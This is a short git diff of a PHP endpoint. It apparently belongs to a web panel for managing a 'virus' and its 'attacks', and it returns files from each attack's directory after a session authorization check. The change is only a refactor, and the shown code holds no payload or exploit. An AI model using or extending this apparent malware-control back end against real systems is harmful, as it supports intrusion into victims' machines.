@@ -3,26 +3,16 @@
 // sends this a get parameter "file" with the name of the file inside of each attack's directory. This will check for
 // permissions and then return back the file.
 
-use Kelvinho\Virus\Header;
+use Kelvinho\Virus\Singleton\Header;
 use function Kelvinho\Virus\goodPath;
 
-if (!$requestData->hasGet("file")) {
-    Header::notFound();
-}
-$file = $requestData->get("file");
-
-if ($requestData->hasGet("desiredName")) {
-    $desiredName = $requestData->get("desiredName");
-} else {
-    $desiredName = "file";
-}
+$file = $requestData->getCheck("file");
+$desiredName = $requestData->get("desiredName", "file");
 
 $virus_id = $session->getCheck("virus_id");
 $attack_id = $session->getCheck("attack_id");
 
-if (!$authenticator->authorized($virus_id, $attack_id)) {
-    Header::forbidden();
-}
+if (!$authenticator->authorized($virus_id, $attack_id)) Header::forbidden();
 
 $relativePath = "/attacks/$attack_id/$file";
 $absPath = DATA_FILE . $relativePath;
